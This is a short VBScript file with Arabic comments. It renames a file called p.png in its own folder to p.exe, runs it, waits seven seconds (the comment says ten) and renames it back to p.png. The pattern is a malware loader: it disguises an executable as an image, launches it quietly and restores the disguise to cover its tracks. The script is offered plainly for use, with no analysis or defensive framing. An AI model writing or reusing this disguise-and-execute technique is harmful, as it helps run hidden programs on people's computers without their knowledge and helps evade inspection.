Set objShell = CreateObject("WScript.Shell")
Set objFSO = CreateObject("Scripting.FileSystemObject")

' تحديد مسار السكربت الحالي
Dim scriptPath
scriptPath = objFSO.GetParentFolderName(WScript.ScriptFullName)

' مسار ملف p.png
Dim pngFilePath
pngFilePath = scriptPath & "\p.png"

' مسار ملف p.exe
Dim exeFilePath
exeFilePath = scriptPath & "\p.exe"

' إعادة تسمية p.png إلى p.exe
If objFSO.FileExists(pngFilePath) Then
    objFSO.MoveFile pngFilePath, exeFilePath
End If

' تشغيل p.exe
If objFSO.FileExists(exeFilePath) Then
    objShell.Run """" & exeFilePath & """", 1, False
    WScript.Sleep 7000 ' الانتظار لمدة 10 ثوانٍ
    ' إعادة تسمية p.exe إلى p.png
    If objFSO.FileExists(exeFilePath) Then
        objFSO.MoveFile exeFilePath, pngFilePath
    End If
End If
